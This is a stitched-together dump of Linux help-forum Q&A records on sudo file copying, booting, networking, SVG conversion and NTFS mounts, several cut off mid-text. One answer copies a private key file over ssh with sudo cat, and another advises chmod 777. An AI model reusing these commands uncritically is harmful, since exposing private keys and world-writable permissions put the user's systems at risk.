The file requires root/sudo access to read or write the file.\nTo do that, I use this command pattern:\nROOT_ONLY_FILE=/etc/pki/private/identity.pem\nssh host sudo ls -l $ROOT_ONLY_FILE\nssh host sudo cat $ROOT_ONLY_FILE | sudo tee $ROOT_ONLY_FILE > /dev/null\nsudo chmod 600 $ROOT_ONLY_FILE\n# sudo chown root:grp $ROOT_ONLY_FILE\n\nIt's very important to keep the owner, group and read-write modes set properly when copying these privileged files.  That is why I start with the ls -l of the remote file.\nThe chmod and chown commands are intended to make sure the copy of the file has the same permissions as the original file.\nCopy remote root access only file to local file\nssh host sudo cat /var/log/messages | cat > /tmp/host.messages\n\nUsing sudo cat $file lets you read the file.  You can't use scp because scp would not allow access to that privileged file but sudo cat runs on the remote system as root so it works.\nCopy local file to remote file that requires special access only\nThere are times when you want to update a remote file that is owned by tomcat or another user.  In this case, you can still use sudo because root is allowed to write to the remote file and doesn't change the files ownership or permission bits when it writes a file that already exists.\nThe command is:\ncat logging.properties | ssh sudo tee /home/tomcat/conf/logging.properties > /dev/null\n\nCopying directories using tar\nWhile the question only asked about files it's important to realize that this approach can also work with directories.\nSee https://unix.stackexchange.com/a/10028/119816 for more details.\n\nA: An older question, I know, but times change and so do some techniques.  Just in case someone is still looking for a streamlined way to accomplish this.\nAssumptions\n\n\n*\n\n*Your user on the server is a sudoers.\n\n*You are running Windows 10.\n\n*The files in /var/www should belong to user:group www-data:www-data\nConcept\nThe concept is to combine remote commands over ssh and scp file transfersers without relying on GUIs such as PuTTy or WinSCP.  These commands can be run either from a Command Prompt or PowerShell.  There are five main tasks to permorm:\n\n\n*\n\n*Environment setup\n\n*Transfer files to server\n\n*Set remote file permissions\n\n*Transfer between remote folders\n\n*Cleanup\n\n\nTasks 3-5 can be performed in a single step.  If you plan to do this often, leaving the environment setup will allow you to omit tasks 1 and 5.\nEnvironment Setup\nYou may or may not already have folder you can use as a temporary repository for the transfer.  If not, you can run:\nssh user@server.tld \"mkdir ~/wwwtemp\"\n\nDepending on your server's settings, you may or may not be prompted for user's password/passphrase to authenticate the ssh session.\nOnce the session is authenticated, the mkdir ~/wwwtemp command will execute then the ssh session will terminate, and you will be back at your prompt (Command Prompt or PowerShell).\nTransfer Files to Server\nThe next thing to do is to transfer the files from the local Windows machine to the Ubuntu server using scp like so:\nscp -R local\\path user@server.tld:~/wwwtemp/\n\nDepending on your server's authentication method, you may or not need to enter a password/passphrase.\nPermissions and Final Destination of Files\nOnce the file transfer has completed, you can run a series of commands over ssh like thusly:\nssh -t user@server.tld \"sudo chown -R www-data:www-data ~/wwwtemp  && sudo mv -R ~/wwwtemp/* /var/www/ && sudo rmdir ~/wwwtemp\"\n\nAgain, depending on the authentication method of your server you may or may not be prompted for a password/passphrase.  Regardless of your authentication method, sudo will prompt you for user's password.  Unless, of course you have disable requirement for password when user runs chown mv and rmdir. See this question for guidance on how to do that.\nThis step covers tasks 3-5:\n\n\n*sudo chown -R www-data:www-data ~/wwwtemp recursively sets the desired file permissions on the files you just uploaded.\n\n*sudo mv -R ~/wwwtemp/* /var/www/ recursively moves the contents of the temporary repository to its final destination.\n\n*sudo rmdir ~/wwwtemp removes the temporary repository.  It is necessary to use sudo here since we changed the directory owner in task 3.\n\n\nOf course, && separates each command.  The commands will be performed in sequence.  If you plan to keep the repository wwwtemp, you can omit the final command in the sequence.\nNotes\nYou can omit && sudo rmdir ~/wwwtemp from the end of the final ssh command string if you would like to continue using the temporary repository in future.  Doing so also means that you can omit the first ssh command each time you desire to transfer files to your server in this manner.\n\nA: $ scp -i example.pem -r sourcefilr.txt ubuntu@10.12.3.4:/example_folder\n\nBefore executing this command we need to give full permissions to example_folder:\n$ sudo chmod 777 example_folder\n\n", "Q: Reboot without actually shutting down Is it possible to do a reboot, without actually rebooting? I have Ksplice, haven't had the chance to use it yet, but need something different. My desktop only will boot into the HD if I enter the bios during boot and tell it to boot from USB then it will boot to the HD, very odd and I have checked my BIOS and set it to default settings in case I may have changed something, but that did not solve it. So basically I do not want to do an actual shutdown/reboot. I added my Brother MFC-295CN and changed the script needed to scan but now I need to reboot to make it work. This is non kernel related so Ksplice will not do. Is there any other way? Would restarting lighdm do the trick? Is it possible?\nThank you for your time and answers\n\nA: First, install the kexec tools using:\nsudo apt-get install kexec-tools\n\nNow, to reboot using kexec one needs to determine the version of the kernel you want to kexec into and also the the boot device and initrd you want to use.\nFor example, to find the current kernel you are running, use:\nuname -r\n\nand a quick and dirty way to find the boot device is to look for the root device in /boot/grub/grub.cfg, e.g:\ngrep \"set=root\" /boot/grub/grub.cfg\n\nand look for the UUID of the boot device.\nSo, for my machine, my kernel is 3.5.0-17-generic, and my UUID is 69822458-67e5-437a-84ab-0c9e5c139d43, so I can load this kernel and initrd images into memory using:\nsudo kexec -l /boot/vmlinuz-3.5.0-17-generic --append=\" linux /boot/vmlinuz-3.5.0-17-generic root=UUID=69822458-67e5-437a-84ab-0c9e5c139d43 ro quiet\" --initrd=/boot/initrd.img-3.5.0-17-generic\n\nand then boot the kernel using:\nkexec -e\n\nOne can kexec into a different kernel version; you don't need to use the one you are running.\n", "Q: grub2 (actually burg) can't see partitions on GPT external hdd I found a sata drive, a semi-broken hdd power supply and an esata cable lying around, so I decided to install Arch on it. \nSo I have sda which has the MBR and grub2 (burg) and then another hdd (below).

I have a laptop with Ubuntu installed as the only OS. I also have a USB stick with a Windows 7 installation on it. I want to install Windows from the USB stick on my laptop but when I try to restart the laptop to get access to BIOS, I can't seem to find the command for it, its like it skips everything and just says Ubuntu and then takes me to the login screen.\nHow do I change the boot priority to USB in Ubuntu?\n\nA: On some systems you have to press F2, Del or Esc to access Bios settings. Less frequently it is CTRL+Alt+ESC.\nOnce in Bios settings, on some systems, while there is a boot order giving you \"removable drives\" and \"primary hard disk\" as options, you may have to set the boot order again in an item labelled \"HDD's\" where you find again the USB drive.\n\nA: The boot priority settings are often found under the Boot tab of the computer's BIOS/UEFI utility. The BIOS/UEFI utility can be accessed by pressing the key which is shown on the manufacturer's splash screen when booting. This is the F12 key on many computers. The keys to press, such as F12, F2, Del or Esc, differ on computers from different manufacturers. When grub bootloader is installed it does not change the key which is used to access the BIOS/UEFI utility.\n\nWhen the power button is pressed to start the computer, it will try to boot first from whatever option is listed first in the boot priority section of the computer's BIOS/UEFI utility. If a USB flash drive is listed first in the boot priority list, it will try to boot from the USB flash drive first. If the internal hard drive where Ubuntu is installed is listed first in the boot priority list, the computer will boot to Ubuntu.\n\nBoot menu and BIOS access keyssource\nManufacturer    Models                                  Boot Menu Key   BIOS Key    \nAcer            Aspire One zg5, zg8, Aspire Timeline    F12             F2    \nAcer            Aspire v3, v5, v7                       F12*            F2  \nAcer                                                    Esc, F2, F12    Del, F2\n\nManufacturer    Models              Boot Menu Key   BIOS Key  \nApple           Post-2006 models    Option\n\nManufacturer    Models              Boot Menu Key   BIOS Key  \nAsus            Desktops            F8              F9  \nAsus    VivoBook f200ca, f202e, q200e, s200e, s400ca, s500ca, u38n, v500ca, v550ca, v551, x200ca, x202e, x550ca, z202e  Esc     Delete  \nAsus    N550JV, N750JV, N550LF, Rog g750jh, Rog g750jw, Rog g750jx Zenbook Infinity ux301, Infinity ux301la, Prime ux31a, Prime ux32vd, R509C, Taichi 21, Touch u500vz, Transformer Book TX300  Esc (Disable \"Fast Boot\" and \"Secure Boot Control\")     F2  \nAsus    k25f, k35e, k34u, k35u, k43u, k46cb, k52f, k53e, k55a, k60ij, k70ab, k72f, k73e, k73s, k84l, k93sm, k93sv, k95vb, k501, k601, R503C, x32a, x35u, x54c, x61g, x64c, x64v, x75a, x83v, x83vb, x90, x93sv, x95gl, x101ch, x102ba, x200ca, x202e, x301a, x401a, x401u, x501a, x502c, x750ja     F8  Delete  \nAsus            Eee PC 1015, 1025c  Esc             F2\n\nManufacturer    Models   Boot Menu Key   BIOS Key  \nCompaq          Presario Esc, F9         F10\n\nManufacturer    Models   Boot Menu Key   BIOS Key  \nDell                     F12**            F2\n\nManufacturer    Models   Boot Menu Key   BIOS Key  \neMachines                F12             Tab, Delete  \nGateway  \n\nManufacturer    Models   Boot Menu Key   BIOS Key  \nFujitsu                  F12             F2\n\nManufacturer    Models   Boot Menu Key   BIOS Key  \nGigabyte                 F12             Del\n\nManufacturer    Models                           Boot Menu Key                           BIOS Key  \nHP                                               Esc, F9                                 Esc, F10, F1  \nHP              Pavilion Media Center a1477c     Esc                                     F10  \nHP              Pavilion 23 All In One           Esc (Select boot media from the menu)   F10  \nHP              Pavilion Elite e9000, e9120y, e9150t, e9220y, e9280t     Esc, F9     F10  \nHP              Pavilion g4, g6 and g7, Probook 4520s, 4525s, 4540s, 4545s, 5220m, 5310m, 5330m, 5660b, 5670b   Esc     F10  \nHP              Pavilion HPE PC, h8-1287c, Pavilion PC, p6 2317c, Pavilion PC, p7 1297cb, TouchSmart 520 PC, ENVY x2, m4, m4-1015dx, m4-1115dx, sleekbook m6, m6-1105dx, m6-1205dx, m6-k015dx, m6-k025dx, touchsmart m7, Envy, dv6 and dv7 PC, dv9700, Spectre 14, Spectre 13, 2000 - 2a20nr, 2a53ca, 2b16nr, 2b89wm, 2c29wm, 2d29wm    Esc (Then F9 for \"Boot Menu\")   Esc  \nHP              2000                             Esc (Then F9 for \"Boot Menu\".

Now create /etc/network/if-pre-up.d/iptables.sh as follows:\n#!/bin/sh\n/sbin/iptables-restore < /etc/network/iptables\n\nBe sure to remember to make both files owned by root, and chmod 400 /etc/network/iptables ; chmod 755 /etc/network/if-pre-up.d/iptables.sh to set permissions appropriately - unprivileged users should not be able to read your actual firewall ruleset, much less change it, but your script in if-pre-up.d must be executable.  (You might optionally chmod it 700 if you're feeling frisky; but I don't see that it'll really keep anything any more secure.)\nYou do not need a down script for this, just a pre-up.

Adobe is not going to release new versions of the player for Linux, it withdrew their Andriod plugin, and Flash never was and never will be supported by iOS. At the same time, all major browsers on all platforms (except old versions of IE) support SVG these days: http://caniuse.com/#search=svg \nIf you build sites with Flash now, in a year or two you'll find that the content does not display properly on the majority of devices your visitors use to access the site. I know what I'm talking about because I manage a site with a lot of Flash content and now I feel I'm starting to get cornered into a \"flash ghetto\" only accessible to some users - while those users are still a majority, the situation is only going to change to the worse.\nUbuntu has an awesome vector editor called Inkscape which supports SVG very well. This may be enough for you if all you need is simple vector graphics. For more complex stuff, such as scripting (which those Flash clones are unlikely to support fully anyway) you'll have to use SVG+JavaScript. I have to admit that the process is not as nice and intuitive as setting keyframes on the timeline in Flash and dragging the stuff around, but it's manageable.\n\nA: you can try this. I hope that will be enough for your needs http://linux.softpedia.com/get/Multimedia/Graphics/Flash-for-Linux-407.shtml\n\nA: This uses SVG as its own save format for project files and can produce swf files so you get the best of both worlds.\nhttp://drawswf.sourceforge.net/\nIt probably won't do if your looking for advanced action scripting abilities though.\n", "Q: Ubuntu 12.10 detecting wrong graphics card I have just done a fresh install of 12.10 on my laptop details are below and it is detecting the wrong graphics cards so now the fan is running very loud.\nIf any could help me I would be very thankful\nHP Pavilion dv6-6b05tx Entertainment Notebook PC2nd generation Intel(R) Core(TM) i7-2670M Processor (2.2GHz, Dual Core, 4T, 6MB L3)8GB DDR3 RAM 750GB SATA HDD Blu-ray ROM DVD+/-R/RW SuperMulti DL Drive 15.6 inch (1920 x 1080) LED Backlit BrightView display ATI Radeon HD 6770M (2 GB dedicated)\n\nA: Do you have two graphics cards?

But others panel items like network or volume looks fine. \n\n*In gnome 3 when I'm on dash with (window preview) if I remove any of the windows   before the remaining windows reshuffle it takes about 2 seconds (noticeable clearly).  \n\n\nEverything else is fine in both unity and Gnome Shell. What is causing this slowness? Is Gnome Shell is really slower?\n\nA: *\n\n*I don't have that myself, but it may be some slowness in gnome-shell or in evolution-data-server (trying to fill the calendar).\n\n*I'm pretty sure that this is a design decision. The idea is that the windows don't reshuffle too soon, because you may be in the process of closing several of them. Then it is really annoying when they move away from your cursor when you were already moving towards them.\n", "Q: Manually edit terminal command history My terminal history has hundreds of command, but I just want to keep a few of them\nIs there a way to manually edit the list of command executed in the terminal?\n\nA: to review your history, open the terminal and just type history\nI would recommend making a copy first by opening a terminal and using this CLI cp ~/.bash_history ~/.bash_history_old\nthen edit the \"old\" one, Once you are satisfied with the result run this cp ~/.bash_history_old ~/.bash_history this will replace the current history. You will be prompted to overwrite y/n? \n\nA: While this would be rather tedious now that almost every command gets logged in your history, you can edit your ~/.bash_history file.\n", "Q: Is there a way to batch export SVGs to PNGs? I have these SVGS and I'd like to export them to PNG images, I could export them with Inkscape but that would mean open each file and export that file to PNG which is not efficient (I have hundreds of them).\nHow can I do this?\n\nA: Graphical Nautilus Script\n\nOverview\nThe command line is great for batch conversions but sometimes you just don't want to leave the comfort of your GUI. That's why I coded a GUI-based Nautilus script to batch convert SVG files to PNG images. Other file managers with custom actions (e.g. Thunar) should be supported, too.\nScreenshot\n\nScript\n#!/bin/bash\n\n# NAME:         SVG2PNG\n# VERSION:      0.1\n# AUTHOR:       (c) 2014 Glutanimate (https://github.com/Glutanimate)\n#\n# DESCRIPTION:  Simple application to convert SVG files to PNG files based on DPI or resolution. \n#               Designed to work as a context menu script in file managers like Nautilus and Thunar.\n#\n# FEATURES:     - Converts SVG image file to PNG raster of a specific DPI or width\n#               - SVG preview\n#               - choose between converting the full SVG page or only the cropped image\n#\n# DEPENDENCIES: inkscape imagemagick yad\n#               YAD (1) is an advanced for of Zenity with many improvements.

The following commands should cover all the necessary dependencies:\nsudo add-apt-repository ppa:webupd8team/y-ppa-manager\nsudo apt-get update\nsudo apt-get install yad inkscape imagemagick\n\nFor further information please consult the script header above.\nUsage\nAfter installing the script you should be able to invoke it from your file manager's context menu. Simply select one or more SVG files and click on the appropriate entry in your context menu. A GUI dialog should come up with several options concering the conversion.\nYou can either convert the SVG based on DPI or width. The aspect ratio will be conserved in both cases. Make sure to supply your DPI or width of choice before clicking on the conversion buttons.\nYou can also choose between exporting the full SVG file or only the cropped drawing. If your SVG canvas has a lot of empty space it's advisable to choose \"Drawing\" as the export option.\n\nA: It appears you can use Inkscape from command line:\n`#{INKSCAPE_PATH} -z -f #{source_svg} -w #{width} -j -e #{dest_png}`\n\nmore details\nI imagine you can write a simple bash script to process all SVG files:\n#!/bin/sh\n\nfor file in *.svg\ndo\n     /usr/bin/inkscape -z -f \"${file}\" -w 640 -e \"${file}.png\"\ndone\n\nthe example above converts all .svg files in the current directory, adding .png extension to the output files.\n\nA: Inspired by the previously accepted answer I came up with this one-liner:\nFor Inkscape version 0.92.4 and earlier:\nfor file in *.svg; do inkscape \"$file\" -e \"${file%svg}png\"; done\n\nThis way you don't need to call a script. If you wanted to, you could create an alias for converting all svgs in the current directory to pngs:\nalias svgtopng='for file in *.svg; do inkscape \"$file\" -e \"${file%svg}png\"; done'\n\nFor Inkscape version 1.0 Beta and later:\nfor file in *.svg; do inkscape \"$file\" -o \"${file%svg}png\"; done\n\nThis way you don't need to call a script. If you wanted to, you could create an alias for converting all svgs in the current directory to pngs:\nalias svgtopng='for file in *.svg; do inkscape \"$file\" -o \"${file%svg}png\"; done'\n\n\nA: Here's a slightly different alternative solution in a more readable scripting language - python. It can batch export all your svgs. Particularly ideal if you're doing Android dev and have to make multiple pngs from a single svg.\nDisclaimer: I wrote the lib. Hope it helps someone.\nClick here.\nFor a simple use, download the library into a folder, put the svgs in the same folder, then run\npython exporter.py\n\nin the command line/terminal after you cd to the folder. For more advanced options, do check out the README.\n\nA: If not all files, but only certain SVG files need to be converted to PNG, one might use sed to automatically generate the file names:\ninkscape --without-gui --export-width=1280 --export-png=`echo $1 |sed -e 's/svg$/png/'` $1\n\n", "Q: Mouse stuck after updating 12.04 I applied a large number of updates to Ubuntu 12.04 (if someone would tell me how to get a list of the applied patches, and I would be happy to post it here), and my mouse refuses to move.\nHow can I fix this issue, or at least revert the updates so that my functionality is restored?\nNote: Ubuntu is running under Hyper-V on a Win 8 Host.\n\nA: The issue was that somehow, some of the updates were corrupted, and did not complete (or similar, not really sure what happened, or why).\nTo fix, run the following:  \nsudo apt-get install -f\nsudo dpkg --configure -a\nsudo apt-get install -f\n\nAnd then restart.\n", "Q: Have windows key (meta) trigger Gnome-do instead of Unity Dash (12.04) On my laptop the Unity Dash often launches really slowly.  I might press the Windows button, and sometimes it will take up to 15 seconds to open, and the system becomes unresponsive during this time.  This is especially likely if I haven't opened the launcher in a few hours.\nI have Gnome-Do installed, and I currently launch it with \"Ctrl + Space\", and it launches instantly and is very responsive.\nI would like to swap my shortcut keys, so Meta (the Windows key) launches Gnome Do, but I can't figure out where to change the keyboard shortcut for the dash.  Any clues?\n\nA: Alright, partly found my answer.  The keyboard shortcut for launching the dash is not in the \"Keyboard Settings\" app, but you can change it from \"CCSM\" (Compiz Config Settings Manager).\n\n\n*\n\n*Install ccsm sudo apt-get install compizconfig-settings-manager\n\n*Run ccsm, open \"Desktop / Ubuntu Unity Plugin\" settings page\n\n*Change \"Key to Show Launcher\" setting\n\n*In \"All Settings / Keyboard\", add a custom shortcut that launches gnome-do\nThis mostly works, for any shortcut other than the Windows (Super) key.  When I enter the shortcut as \"Super L\", it fails to launch.  Any other shortcut appears to work.\n", "Q: XBMC using a lot of CPU when fullscreen I'm just starting to try out XBMC (from the ubuntu repo) and noticed that it's using a lot of CPU when running fullscreen, even when I'm not playing a movie. There's a definite lag even on the home page with the scrolling footer.\nI've toggled the option to use it in windowed mode and it seems to be a lot more responsive. The footer lag seems to be gone.\nDoes anyone know why this is happening? I would have thought that running fullscreen would have used less resources.\n\nA: For me, Compiz didn't play well with xbmc at all, that is why I made the following script to start XBMC:\n#!/bin/bash\nmetacity --replace &\nsleep 2s\nxbmc\nunity --replace &\nexit;\n\nIt replaces compiz with metacity, and then starts xbmc. When xbmc exits, you get compiz back (there may be some flickering when compiz is restarting)\nYou can save the script as xbmc.bash and make it executable using \nchmod +x xbmc.bash\n\nThen start it! I hope this works for you!\n", "Q: Ubuntu 12.10 Ubuntu-Guest and VirtualBox(Windows) host \nPossible Duplicate:\nVirtualbox DNS stopped working on upgrade to 12.10 \n\nThe internet connection on the Windows Guest is not working.

I want to give Windows 8 a try but at the same time I don't want to screw up the setup I have, and I still want to keep Windows 7. So my question is, will there be a problem if I install Windows 8?\n\nA: There would be no problem if you install windows 8 on another partition, but there will be a problem when you format the Windows 7 partition and install Windows 8, you will no longer be able to boot Ubuntu because you have installed Ubuntu using the Wubi installer. \n\nA: First : after you install windows 8 ( in a separate partition ), it will detect windows 7 so your boot option will contain both windows .\nbut most probably you will loose the option to boot with Ubuntu.\nYou may fix this simply by, \ntry and copy 'root.disk' file from your Ubuntu installation drive using anything live boot or anything..

I'm not dual booting with any other OS, just using 2x320gb drives and have been choosing to install using the entire disk. \nAny ideas what I'm doing wrong or can do to fix this? Thanks\n\nA: As I seem you should have used guided partition skim, when you are going to install grub it doesn't see that, so  you should make a small (1MB) partition on each disk and RAID them together and set it as a GRUB boot partition. Set up your other RAID partitions (e.g. swap and /) and then the GRUB installer should find the boot area just fine.\n", "Q: Dual Installation of Windows with Ubuntu on UEFI DUET system I have a Sony Vaio laptop which has a BIOS enabled motherboard. I recently bought an SSD. I was using Arch and Ubuntu with Windows 7 on my 320GB HDD before that and would prefer doing the same after installing the new SSD.\nI wanted to use GUID partition table (GPT) on my SSD for the reason that it supports more than just 4 partitions.

Moreover, it also does not recognize the Arch Linux partition either, which I think I installed successfully.\nI tried the solution by jarondl in here but not to much help.\nQuestions:\n\n\n*\n\n*How I can I direct my Ubuntu (and/or Arch) to install kernels on /dev/sda1?  \n\n*Can I install rEFInd on my system? \n\n*Can I upgrade my Windows 7 to Windows 8 or do a fresh install of Windows 8, will that create a problem?\n\nA: First, it's not clear if the Ubuntu-installed GRUB is the BIOS-mode version or the EFI-mode version. If the former, you should be able to reconfigure it to launch DUET as well as Ubuntu, which should restore everything else to bootability. To do this, you'll need to edit /etc/grub.d/40_custom to add a boot entry for DUET. Alternatively, you could restore SYSLINUX and then later get your Ubuntu installation booting in EFI mode by replacing the BIOS-mode GRUB with another EFI-mode boot loader. If Ubuntu installed an EFI-mode GRUB, you'll need to either reconfigure GRUB to detect and boot your other OSes or supplement or replace it with something else. My EFI Boot Loaders for Linux Web page describes some of your options.\nYou can tell which version of GRUB you've installed by checking whether you've installed the grub-pc or grub-efi package in Ubuntu; the former is the BIOS-mode package and the latter is an EFI-mode meta-package (it actually installs an architecture-specific package).\nIf you find that you're using the EFI-mode GRUB, then installing rEFInd should be pretty easy -- you'll just need to install it using the instructions on the rEFInd Web site. Under DUET, you're likely to have to name it EFI/BOOT/bootx64.efi on the ESP, since DUET seems to forget the changes created by efibootmgr, in my experience. FWIW, my own BIOS-based laptop is booting Windows 7, Fedora 17, and Mint via DUET and rEFInd. (That said, I maintain rEFInd and I'm the author of the Web page on DUET you referenced, so I'm not exactly a novice at this game.)\n\nA: According to your last Boot-Info ( http://paste.ubuntu.com/1331027/ ):\n\n\n*\n\n*sda1 is an ESP (EFI partition), so you cannot install any kernel in it.\n\n*you have already installed Refind.\n\n*if Microsoft did its job well, upgrading Windows7 to Windows8 should not be a problem.

I am on 3.2.0-32-generic #51-Ubuntu SMP Wed Sep 26 21:33:09 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux\n", "Q: How to setup live ubuntu server? I have set up my Ubuntu server on VirtualBox and now I want to take it live. I've registered a free domain (My Dot TK domain, for testing purposes before I purchase the real deal) but now it requires FORWARD URL.... Do I use my external (public) IP address or what? And what do I set up in my router — is there a particular port that I should open, for example? I am really a newbie at all this. Please help. Thanks!\nMy server:\nIP address: 192.168.0.33\nBroadcast address: 192.168.0.255\n\nA: These IP addresses are private IP addresses ­— that is, they can be used only in a private network. To take your website public you have to obtain a public IP address from a service provider. After that, you will have to register an Host (A) DNS record, aka a Forward DNS record, also from a service provider.\nAbout configuring a router, Do you have a firewall/router? Or you need to set up your Ubuntu server as your router?\nAbout ports, what is the use of this server? If you want it to be a web server, you will have to forward port 80 on your firewall. Please elaborate.\n\nA: Well, you should give the server a static internal ip-adres:\nEdit /etc/network/interfaces (see the iface eth0 part)\n\nsudo nano /etc/network/interfaces\n\nso that it looks like:\n\nauto eth0\niface eth0 inet static\naddress 192.168.1.23   # Your ip address here\nnetmask 255.255.255.224 # Your netmask here\ngateway 192.168.1.1     # Your gate address here\ndns-nameservers 8.8.8.8 8.8.8.4  # Google's nameservers\n\n\nAfter that either restart or do the following:\n\nsudo ifdown eth0\nsudo ifup eth0\n Found here.\nMAKE SURE you don't use an already used internal ip, so just make it something like 192.168.1.200.\nNow you log in to your modem, and add a virtual server, let it point to the new internal ip you set for the server. Open the correct ports and you should be ready to go.\nIf your modem doesn't support a virtual server, just open the required ports.\nThe default website port is 80. But at dot.tk you can always say, refer to external-ip:port.\nI hope this helped, and you can always ask when this isn't clear enough(since its a wall of text).\nHave a nice day\n", "Q: Permissions on automounted NTFS drive I have an external NTFS hard drive.  It automounts with rwx rights for the active user.\nI am able to create directories, update files, write to existing files, change names of files, etc.\nWhat isn't working is creating new files.  Not in newly created directories, nor anywhere else.  Under Windows my drive has currently only one user (everyone) with full access.\nI also tried using fstab and NTFS-3G to mount the drive with different kind of permissions, but the results are the same: I can't create new files.\nAny suggestions on how to solve this?\n\nA: Sorry if I wasn't clear v2r\nThere is another box to tick if you click advanced but that is if you have more than 1 NTFS partition but if you only have 1 NTFS partition it should be ticked as default but look anyway just to make sure otherwise there are only 2 boxes to tick.\n1 box is called \"Enable write support for external devices\" and the other box is called \"Enable write support for internal devices\" so depending if your NTFS drive is internal or external tick the relevant box. \nSorry I can't give you screenshots not enough rep points yet but I'll replace the url typed at the bottom with a screenshot as soon as I have enough points it will have an example of NTFS Configuration Tool or type NTFS Configuration Tool in Google image search.\n\n\nEdit: This method worked for me.\nOpen up Ubuntu Software Centre and type NTFS and install NTFS Configuration Tool (it should be the first one in the list of results). Once installed run NTFS Configuration Tool and tick both boxes and now you should have full access to to your drive.\n", "Q: Dump video data from RAM DISK to the HARD DISK? This is the story:  \nSome online video streaming sites like www.putlocker.com won't allow Adobe Flash Player to cache the streaming videos on your Hard Disk, so the users can't watch them offline.\nInstead they use RAM Disk to cache the streaming videos.\nI was wondering, if there is a way to take off the data files I want, from the RAM and store them on my hard disk...\n(May be by mounting the whole RAM as a filesystem or by a code)\nI know there are video downloaders out there, but this question is for educational purpose, and may also apply to the other kind of data types rather than videos.  \nHas anyone got a clue..?\nThanks in advance.\n\nA: Try using DDD, a Front end of GDB, in which you can view and edit the contents of RAM. I'm not sure this is what you really need, but try check it out\n", "Q: Ubuntu recognises other partitions but does not show the contents I hold up my hand to confess I'm an immigrant from Microsoft and I use the computer as a tool, not a hobby. Ubuntu (12.10) recognizes the partitions used for Windows, e.g. my docs but not it's contents. Can I ever save there? If not, can I copy Ubuntu files to Windows?\n\nA: Open a Terminal window and type the following command:\nsudo apt-get install ntfs-config\n\nThis will install a small program that lets you turn on a few things for your Windows NTFS partitions and enable you to write to them...  You will find the program in your application menu after install or in Unity by searching for NTFS.\n", "Q: Make GDM3 in Ubuntu 12.10 show a list of available languages The local computer pool is used by a large number of students that prefer to choose the language of the Ubuntu desktop.

When it asked me what type of file system, I selected FAT but there was a checkbox below that said \"Encrypt\" and I accidently checked it and continue.\nI had no choice but to come up with a passphrase for it, and so I did, thinking I was able to remove that encryption.

16:33:14 2012 -0700\n\n    mm: fix invalidate_complete_page2() lock ordering\n\n    commit ec4d9f626d5908b6052c2973f37992f1db52e967 upstream.\n\n    In fuzzing with trinity, lockdep protested \"possible irq lock inversion\n    dependency detected\" when isolate_lru_page() reenabled interrupts while\n    still holding the supposedly irq-safe tree_lock:\n\n    invalidate_inode_pages2\n      invalidate_complete_page2\n        spin_lock_irq(&mapping->tree_lock)\n        clear_page_mlock\n          isolate_lru_page\n            spin_unlock_irq(&zone->lru_lock)\n\n    isolate_lru_page() is correct to enable interrupts unconditionally:\n    invalidate_complete_page2() is incorrect to call clear_page_mlock() while\n    holding tree_lock, which is supposed to nest inside lru_lock.\n\n    Both truncate_complete_page() and invalidate_complete_page() call\n    clear_page_mlock() before taking tree_lock to remove page from radix_tree.\n     I guess invalidate_complete_page2() preferred to test PageDirty (again)\n    under tree_lock before committing to the munlock; but since the page has\n    already been unmapped, its state is already somewhat inconsistent, and no\n    worse if clear_page_mlock() moved up.\n\n    Reported-by: Sasha Levin <levinsasha928@gmail.com>\n    Deciphered-by: Andrew Morton <akpm@linux-foundation.org>\n    Signed-off-by: Hugh Dickins

found (::,)\n\nI suspect it has something to do with the fact, that I build kernel for Quantal on Precise. Maybe this path doesn't support such cross-version building scenario. Or maybe the tutorial missed something obvious to kernel hackers, which I didn't know. \nUpdate:\nI figured I need to install the devscripts for the dch, but the problem persists; I've updated the output.\n\nA: I've updated the howto here: https://wiki.ubuntu.com/Kernel/KernelBisection#Bisecting_upstream_kernel_versions_to_single_commit\nNow it points to https://wiki.ubuntu.com/KernelTeam/GitKernelBuild which works much better than the previous instructions.\nI'm still working on making the GitKernelBuild page better, but it walks you through the entire setup as opposed to the mainline-build-one.\nPlease let me know if this works for you and if there is anything else that can be improved about those documents.\n", "Q: Lubuntu and backup software? I use unity and I appreciate the backup facilities incorporate since 12.04 (deja dup). \nIs it possible to use it with Lubuntu ? One of the advantages of the integration of deja dup in unity is the possiblity to recover a file by a right clic in a directory where that file was located. Is it possible to do that in lubuntu ?\n\nA: There is no reason not to continue using deja dup as your backup manager. \nIt is fully supported through 13.04 as I use it currently in Lubuntu, version 25.3-Ounbunu1.\nYou can install this using the Software Center, Synaptic or CLI in terminal.\nsudo apt-get install deja-dup\n\n\n\nA: To get the same file manager integration, you must install and use nautilus, the GNOME file manager.\nAlternatively, you could do something like the following in a terminal:\n  deja-dup --restore /path/to/file\n\nA: @Ger Answering my interpretation of your question (which is identical with the question I had 5 five minutes ago): Deja Dup becomes accessible (launch-able) through the menu items Accessories -> Backups and Preferences -> Backups.  That's my experience in Lubuntu 16.04.2, anyway.  I noticed neither until after logging out and logging back in.  Since I made some effort to find an appropriate menu item, I'm happy to conclude they were not there until after my new log in.  (Rather than log out, there's very probably something less disruptive you can do, such as restarting the window manager, to attain the same goal.)\nThe initial state of the Deja Dup window was not a good match with Ringtail's screen shot.\n", "Q: How to step up my CPU's frequency? I installed xubuntu 12.10 in a Fujitsu Siemens laptop with Intel Pentium M processor 1.86Ghz.\nI noticed that the processor's frequency that the \"System information\" mentions is only 800Mhz (step down frequency).\nHow can I step up the frequency up to the processor's maximum (1.86GHz)?\n\nA: The default mode for CPU frequency in Ubuntu is Ondemand, with demand the speed goes up, however you can control that either with cpu-freq indicator or Jupiter power applet.\n\nA: Thank you all for your attention and will to help.\nIt turns out that all I needed to do is to install \"cpufrequtils\" from the Ubuntu Software Center.\n\nA: You can see the available CPU frequencies using the following command:\ncat /sys/devices/system/cpu/cpu*/cpufreq/scaling_available_frequencies\n\nand you can see the current CPU frequency using:\ncat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq\n\nSo here is an idea, run the following command in one terminal to observe the current CPU frequencies:\nwatch -n 1 cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq\n\n..and then run some CPU demanding applications and you should see the CPU frequencies ramp up and down as the load changes. \n", "Q: Does \"diff\" exist for images? You can compare two text files very easy with diff and even better with meld:\n\nIf you use diff for images, you get an example like this:\n$ diff zivi-besch.tif zivildienst.tif \nBinary files zivi-besch.tif and zivildienst.tif differ\n\nHere is an example:\nOriginal from http://commons.wikimedia.org/wiki/File:Tux.svg\n\nEdited:\n\nI've added a white background to both images and applied GIMPs \"Difference\" filter to get this:\n\nIt is a very simple method how a diff could work, but I can imagine much better (and more complicated) ones. \nDo you know a program which works for images like meld does for texts?\n(If a program existed that could give a percentage (0% the same image - 